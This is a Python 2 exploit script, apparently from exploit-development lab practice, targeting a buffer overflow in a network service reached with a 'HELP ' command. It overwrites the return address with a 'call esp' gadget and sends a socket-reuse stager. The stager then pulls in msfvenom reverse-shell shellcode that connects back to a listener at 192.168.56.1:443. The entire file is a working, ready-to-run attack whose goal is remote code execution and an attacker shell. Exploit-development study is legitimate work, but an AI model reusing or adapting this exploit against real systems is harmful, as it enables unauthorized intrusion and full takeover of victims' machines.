#!/usr/bin/python

from time import sleep

import sys, socket

#0x7e429353 : call esp | [USER32.dll] 
EIP = "\x53\x93\x42\x7e"

#socket descriptor at 0022fae4 on stack at crash. ESP = 0022fba0

Stager = (
"\x8B\xEC\x83\xC5\x79\x83\xC5\x79\x83\xC5\x79\x83\xC5\x79\x8B\x6D\x28" #find socket descriptor - 17 bytes
"\x51\x48\x50\x55\x51\x55\xE8\x6B\x50\x88\x71" 				#Send data - 11 bytes
"\x59\x51\x33\xc0\x50\x53\x51\x55\xE8\xA6\x6B\x88\x71\x59\xFF\xE1"             # Recv second stage and jump - 14 bytes
)

#Push ebp, call 779f97f3
Setup = (
"\x28"*7
)

Stage2 = ( #msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.56.1 -f c --bad-chars="\x00"
"\xba\xaa\x88\x23\x55\xd9\xf6\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x55\x12\x03\x55\x12\x83\x6f\x8c\xc1\xa0\x93\x65\x87"
"\x4b\x6b\x76\xe8\xc2\x8e\x47\x28\xb0\xdb\xf8\x98\xb2\x89\xf4"
"\x53\x96\x39\x8e\x16\x3f\x4e\x27\x9c\x19\x61\xb8\x8d\x5a\xe0"
"\x3a\xcc\x8e\xc2\x03\x1f\xc3\x03\x43\x42\x2e\x51\x1c\x08\x9d"
"\x45\x29\x44\x1e\xee\x61\x48\x26\x13\x31\x6b\x07\x82\x49\x32"
"\x87\x25\x9d\x4e\x8e\x3d\xc2\x6b\x58\xb6\x30\x07\x5b\x1e\x09"
"\xe8\xf0\x5f\xa5\x1b\x08\x98\x02\xc4\x7f\xd0\x70\x79\x78\x27"
"\x0a\xa5\x0d\xb3\xac\x2e\xb5\x1f\x4c\xe2\x20\xd4\x42\x4f\x26"
"\xb2\x46\x4e\xeb\xc9\x73\xdb\x0a\x1d\xf2\x9f\x28\xb9\x5e\x7b"
"\x50\x98\x3a\x2a\x6d\xfa\xe4\x93\xcb\x71\x08\xc7\x61\xd8\x45"
"\x24\x48\xe2\x95\x22\xdb\x91\xa7\xed\x77\x3d\x84\x66\x5e\xba"
"\xeb\x5c\x26\x54\x12\x5f\x57\x7d\xd1\x0b\x07\x15\xf0\x33\xcc"
"\xe5\xfd\xe1\x43\xb5\x51\x5a\x24\x65\x12\x0a\xcc\x6f\x9d\x75"
"\xec\x90\x77\x1e\x87\x6b\x10\xe1\xf0\x4b\xe1\x89\x02\xab\xe0"
"\xf2\x8a\x4d\x88\x14\xdb\xc6\x25\x8c\x46\x9c\xd4\x51\x5d\xd9"
"\xd7\xda\x52\x1e\x99\x2a\x1e\x0c\x4e\xdb\x55\x6e\xd9\xe4\x43"
"\x06\x85\x77\x08\xd6\xc0\x6b\x87\x81\x85\x5a\xde\x47\x38\xc4"
"\x48\x75\xc1\x90\xb3\x3d\x1e\x61\x3d\xbc\xd3\xdd\x19\xae\x2d"
"\xdd\x25\x9a\xe1\x88\xf3\x74\x44\x63\xb2\x2e\x1e\xd8\x1c\xa6"
"\xe7\x12\x9f\xb0\xe7\x7e\x69\x5c\x59\xd7\x2c\x63\x56\xbf\xb8"
"\x1c\x8a\x5f\x46\xf7\x0e\x6f\x0d\x55\x26\xf8\xc8\x0c\x7a\x65"
"\xeb\xfb\xb9\x90\x68\x09\x42\x67\x70\x78\x47\x23\x36\x91\x35"
"\x3c\xd3\x95\xea\x3d\xf6"
)

Crash = "HELP " + Setup + EIP + Stager + "\x90"*7 + Stage2

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.56.101', 4321))

Banner = s.recv(1024)

print "[*] Receiving Banner: \r\n"

print Banner + "\r\n"

print "[*] Sending Stager and sleeping...\r\n"
s.send(Crash)

print "[*] Receiving junk...\r\n"
response2 = s.recv(1024)
print response2

print "\r\n [*] Sending second stage \r\n"

print "Shell delivered! :D \r\n"

s.close
